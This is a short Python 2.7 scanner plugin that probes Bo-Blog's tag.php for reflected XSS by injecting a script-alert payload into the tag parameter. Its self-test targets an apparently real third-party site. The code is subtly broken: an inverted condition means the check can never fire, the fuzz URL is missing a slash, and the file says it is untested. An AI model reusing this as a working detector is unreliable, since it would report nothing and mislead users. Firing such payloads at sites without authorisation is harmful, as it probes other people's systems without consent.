#!/usr/bin/python2.7
#coding:utf-8

import requests
import re
from dummy import *

info = {
	'NAME':'Bo-Blog tag.php XSS',
	'AUTHOR':'七剑,yangbh',
	'TIME':'20140811',
	'WEB':'',
	'DESCRIPTION':''
}
opts = {
	'url':'http://testasp.vulnweb.com',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url'],
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'Bo-Blog':
			return True
	return False

def Audit(services):
	url = services['url'] + "/tag.php"
	try:
		rqu = requests.get(url)
		if rqu.text:
			res = rqu.text
			m = re.search('title="[^"]+"><span style="font[^"]+">([^<]+)</span></a>', res, re.I)
			if m:
				tag = m.group(1)
				# fuzz xss
				fuzz_url = services['url'] + 'tag.php?tag=' + tag + '&mode=1>%22><ScRiPt>alert(/xss%20test/)</ScRiPt>'
				fuzz_rqu = requests.get(fuzz_url)
				if not fuzz_rqu.text:
					res = fuzz_rqu.text
					if res and res.find('\\"><ScRiPt>alert(/xss test/)</ScRiPt>') != -1:
						security_warning(url)

	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)